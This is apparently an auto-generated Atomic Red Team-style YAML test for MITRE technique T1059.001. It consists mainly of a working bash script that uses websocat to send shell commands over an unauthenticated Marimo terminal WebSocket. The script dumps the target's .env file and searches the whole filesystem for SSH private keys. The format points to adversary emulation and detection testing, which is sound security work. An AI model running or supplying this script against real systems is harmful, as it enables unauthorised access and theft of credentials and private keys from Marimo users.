# Auto-generated by CIPHER v5.0
# Source: 8283db33c119
attack_technique: T1059.001
display_name: "T1059.001 - Collect .env and SSH keys via Marimo WS"
atomic_tests:
  - name: "T1059.001 - Collect .env and SSH keys via Marimo WS"
    description: |
      After establishing the unauthenticated WebSocket, retrieve .env file and search for SSH private keys.
    supported_platforms:
      - linux
    executor:
      name: bash
      command: |
        #!/usr/bin/env bash
        set -euo pipefail
        TARGET="${1:-127.0.0.1:8080}"
        # Send multiple commands in one session
        echo '{"type":"stdin","content":"cat .env\n"}' |
          websocat -t "ws://${TARGET}/terminal/ws" | jq -r '.content' > /tmp/marimo_env.txt
        echo '{"type":"stdin","content":"find / -name \"id_rsa\" 2>/dev/null\n"}' |
          websocat -t "ws://${TARGET}/terminal/ws" | jq -r '.content' > /tmp/marimo_keys.txt
        cat /tmp/marimo_env.txt
        cat /tmp/marimo_keys.txt
      cleanup_command: |
        rm -f /tmp/marimo_env.txt /tmp/marimo_keys.txt
